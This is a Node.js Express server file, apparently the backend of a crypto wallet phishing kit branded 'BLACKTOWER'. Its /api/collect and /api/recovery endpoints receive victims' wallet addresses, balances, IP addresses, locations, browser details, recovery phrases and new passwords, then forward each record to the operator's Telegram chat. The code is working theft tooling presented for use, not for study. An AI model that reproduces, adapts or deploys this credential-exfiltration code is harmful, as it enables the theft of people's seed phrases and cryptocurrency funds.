const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramNotification(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Telegram credentials missing');
        return false;
    }

    const message = `🔐 **BLACKTOWER - WALLET CONNECTED** 🔐

👛 **Wallet Address:** \`${data.walletAddress}\`
💰 **Balance:** ${data.balance} ETH
💵 **USD Value:** $${data.usdValue}

🌍 **Location:** ${data.city}, ${data.region}, ${data.country}
📡 **IP Address:** \`${data.ipAddress}\`

🖥️ **Platform:** ${data.platform}
🌐 **Browser:** ${data.userAgent}

⏰ **Time:** ${new Date(data.timestamp).toLocaleString()}

🔗 **Etherscan:** https://etherscan.io/address/${data.walletAddress}
🔍 **IP Lookup:** https://ipinfo.io/${data.ipAddress}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });
        console.log('✅ Telegram notification sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

async function sendRecoveryNotification(data) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('❌ Telegram credentials missing');
        return false;
    }

    const messageType = data.type === 'auto_recovery' ? 'AUTO RECOVERY PHRASE' : 'MANUAL RECOVERY';
    
    const message = `🔑 **BLACKTOWER - ${messageType}** 🔑

👛 **Wallet Address:** \`${data.walletAddress}\`
🔐 **Recovery Phrase:**
\`\`\`
${data.recoveryPhrase}
\`\`\`

${data.newPassword ? `🔒 **New Password Set:** ${data.newPassword}\n` : ''}
⏰ **Time:** ${new Date(data.timestamp).toLocaleString()}

⚠️ **THIS IS SENSITIVE INFORMATION**`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        console.log('✅ Recovery notification sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram recovery error:', error.message);
        return false;
    }
}

app.post('/api/collect', async (req, res) => {
    try {
        console.log('📥 Received wallet connection data:', {
            wallet: req.body.walletAddress?.slice(0, 10) + '...',
            ip: req.body.ipAddress,
            country: req.body.country
        });

        const telegramSent = await sendTelegramNotification(req.body);
        
        if (telegramSent) {
            res.json({ 
                success: true, 
                message: 'Data collected and sent successfully' 
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'Failed to send Telegram notification' 
            });
        }
    } catch (error) {
        console.error('❌ API error:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message 
        });
    }
});

app.post('/api/recovery', async (req, res) => {
    try {
        console.log('📥 Received recovery data:', {
            wallet: req.body.walletAddress?.slice(0, 10) + '...',
            type: req.body.type || 'manual'
        });

        const telegramSent = await sendRecoveryNotification(req.body);
        
        if (telegramSent) {
            res.json({ 
                success: true, 
                message: 'Recovery data sent successfully' 
            });
        } else {
            res.status(500).json({ 
                success: false, 
                message: 'Failed to send recovery notification' 
            });
        }
    } catch (error) {
        console.error('❌ Recovery API error:', error);
        res.status(500).json({ 
            success: false, 
            message: error.message 
        });
    }
});

app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'online',
        telegram: TELEGRAM_BOT_TOKEN ? 'configured' : 'not configured',
        timestamp: new Date().toISOString()
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌍 Health check: http://localhost:${PORT}/api/health`);
    console.log(`📱 Frontend: http://localhost:${PORT}`);
    console.log(`🔧 Telegram configured: ${TELEGRAM_BOT_TOKEN ? 'YES' : 'NO'}`);
});
